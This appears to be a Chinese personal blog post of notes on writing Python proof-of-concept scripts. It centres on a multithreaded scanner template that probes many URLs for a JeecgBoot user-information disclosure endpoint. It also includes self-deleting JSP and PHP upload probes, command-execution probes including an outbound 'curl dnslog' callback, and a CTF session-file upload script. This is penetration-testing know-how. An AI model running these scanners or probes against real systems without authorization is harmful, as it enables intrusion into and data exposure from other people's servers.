---
title: POC编写
date: 2023/5/1 18:00:25
categories:
- Python
tags:
- POC
---

## 单个POC模板

```python
import os
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser
from colorama import init
from colorama import Fore
init(autoreset=True)

requests.packages.urllib3.disable_warnings()

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()

        if self.args.file:
            self.init()
            self.urlList = self.loadURL()  
            self.multiRun()
            self.start = time.time()
        else:
            self.verfyurl()  
    
    def banner(self):
        logo = r"""
                                     .__          
  ____ ___  ________    _____ ______ |  |   ____  
_/ __ \\  \/  /\__  \  /     \\____ \|  | _/ __ \ 
\  ___/ >    <  / __ \|  Y Y  \  |_> >  |_\  ___/ 
 \___  >__/\_ \(____  /__|_|  /   __/|____/\___  >
     \/      \/     \/      \/|__|             \/                                                                                                  
                                            author： Khaz
                                            GitHub： https://github.com/Khaz
        """
        print("\033[91m" + logo + "\033[0m")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. http://127.0.0.1)")
        parser.add_argument("-f", "--file", required=False, type=str, help=f"Target file(e.g. url.txt)")
        parser.add_argument("-t", "--thread", required=False, type=int, default=5, help=f"Number of thread (default 5)")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="Request timeout (default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help=f"Vuln url output file (e.g. result.txt)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()
    
    def proxy_server(self):
        proxy = self.args.proxy
        return proxy

    # 初始化脚本配置
    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")

    # 返回poc的返回包
    def respose(self, url):
        proxy = self.args.proxy
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/jeecg-boot/sys/user/querySysUser?username=admin"
        url = urljoin(url, path)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        
        }

        try:
            response = requests.post(url, headers=headers, proxies=proxies, timeout=self.args.timeout, verify=False, allow_redirects=False)           
            resp = response.text
            return resp               
        except:
            return "conn"  
        
    # 单条url检测
    def verfyurl(self):
        url = self.args.url
        repData = self.respose(url)
        if "\"username\":\"admin\"" in repData:
            print(Fore.GREEN +"[+] 漏洞存在！！！[+] url: {}".format(url))        
        elif "conn" in repData:
            print("[-] URL连接失败！ [-] url: {}".format(url))
        else:
            print("[x] 未检测到漏洞！[x] url: {}".format(url))

    # 多条url检测
    def verify(self, url):
            repData = self.respose(url)
            if "\"username\":\"admin\"" in repData:
                msg = Fore.GREEN +"[+] 漏洞存在！！！[+] url: {}".format(url)
                self.lock.acquire()
                try:
                    self.findCount +=1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            elif "conn" in repData:
                msg = "[-] URL连接失败！ [-] url: {}".format(url)
            else:
                msg = "[x] 未检测到漏洞！[x] url: {}".format(url)
            self.lock.acquire()
            try:
                print(msg)
            finally:
                self.lock.release()
       
    # 导入文件中的url
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for u in f.readlines():
                u = u.strip()
                urlList.append(u)
        return urlList
    
    # 多线程
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        if self.args.url:
            executor.map(self.verify, self.url)
        else:
            executor.map(self.verify, self.urlList)

    # 保存结果
    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    # 结果统计输出
    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()

```

## 文件上传poc

- JSP

  ```jsp
  <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
  ```

  > 通过调用`application.getRealPath(request.getServletPath())`来获取当前请求的Servlet路径，并将其转换为真实的文件路径。然后，使用`new File()`来创建一个表示该文件的File对象，并调用`.delete()`方法来删除该文件。

- PHP

  ```php
  <?php echo base64_decode("M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=");$file_path = $_SERVER['DOCUMENT_ROOT'].$_SERVER['REQUEST_URI'];unlink($file_path);?>
  ```



## 命令执行POC

```
echo $((8#77777)) # 有回显检测32767
curl dnslog # 能出网检测dnslog
```





## 文件上传

假设上传文件的表单如下

```html
<input type="file" name="file" multiple="true" required="true"/>
```

对应脚本

```python
import requests

url = 'http://e1c9d16a-1928-4d06-8480-e770e3b7a0a8.node4.buuoj.cn:81'

# { name : (文件名,文件内容，文件MIME)  }  将文件信息填入元组（）中，只有文件内容是必选的。

# 上传本地文件
files = {"file": ("sess", open('D:\phpstudy_pro\phpstudy_pro\Extensions/tmp/tmp/sess_t6c3cbbvj9p0k6njfkso5kmddr', 'rb'))}

# 直接上传文件内容字符串（注意要用二进制）
# files = {"file": ("sess", b'\x08usernames:5:"admin";')} 


data = {
    'direction':'upload',
    'attr':''
}

res = requests.post(url, data=data ,files=files)
```





## 配合burp抓包

```python
pro = {'http': 'http://127.0.0.1:8080',
'https': 'http://127.0.0.1:8080'
}

# verify=False不鉴别burp的ssl证书，否则无法代理https
requests.get(url=url,proxies=pro, verify=False)
```



## 脚本参数

![image-20230810184821837](E:/blog/source/images/image-20230810184821837.png)

```python
python xx.py aa

sys.argv[0]→xx.py
sys.argv[1]→aa
```

```python
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", type=str, help="target url")
parser.add_argument("-t", "--threads" , type=int, help="threads num")
args = parser.parse_args()

>>
python xx.py -u xx.com -t 20

args.url=xx.com
args.threads=20
```



## 多线程

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

f= open('./host.txt','w')

def get(url):
    res = requests.get(url=url)
    if res.status_code == 200:
        f.write(url+"\n")

if __name__ == '__main__':

    urls=[]
    for i in range(0,500):
        urls.append('http://192-168-1-{}.pvp2039.bugku.cn'.format(i))
    
    with ThreadPoolExecutor(max_workers=50) as pool:
        # 提交任务
        futures = [pool.submit(get,url) for url in urls]

        # 等待所有任务完成
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)
```

```python
import requests
import threading

# 设置最大并发数量为20
max_concurrent = threading.BoundedSemaphore(20)

def worker(url):
    """线程执行的函数"""
    with max_concurrent:
        try:
            response = requests.get(url, verify=False, timeout=3)
        except:
            pass


if __name__ == "__main__":
    # 创建并启动线程
    threads = []
    with open('result.txt') as f:
        for url in f:
            url = url.replace("\n", "")
            thread = threading.Thread(target=worker, args=(url,))
            thread.start()
            threads.append(thread)

    # 等待所有线程结束
    for thread in threads:
        thread.join()
```



## 关闭ssl告警

```python
import warnings
from urllib3.exceptions import InsecureRequestWarning

# 禁用警告
warnings.simplefilter('ignore', category=InsecureRequestWarning)
```



## 颜色变化

```python
from colorama import init
from colorama import Fore
init(autoreset=True)

print(Fore.GREEN + f"[+]{url}存在漏洞！！！！")
```





## JSON

```
加载与解码JSON数据：

json.loads()函数可以将JSON字符串解析为Python对象。
json.load()函数可以从文件中读取JSON数据并解析为Python对象。
编码与保存JSON数据：

json.dumps()函数可以将Python对象转换为JSON格式的字符串。
json.dump()函数可以将Python对象转换为JSON格式的字符串并写入文件。
操作与访问JSON数据：

解析后的JSON数据会被转换为相应的Python数据类型，如字典、列表等，可以像操作普通Python对象一样对其进行访问和操作。
处理特殊情况：

json.JSONEncoder类可以自定义JSON编码器，以处理特殊数据类型或对象的编码。
json.JSONDecoder类可以自定义JSON解码器，以处理特殊的JSON数据格式或特定需求。
```



## 其他

```python
url = urljoin(url, path)
```



## 问题

- requests.exceptions.TooManyRedirects: Exceeded 30 redirects.

  ```python
  allow_redirects=False
  ```

- 使用.format![image-20230824220255340](E:/blog/source/images/image-20230824220255340.png)

  ```python
  字符串里原本就有{}时用其他的字符串格式化
  f"{xx}"
  f"%s" % xx
  ```

  

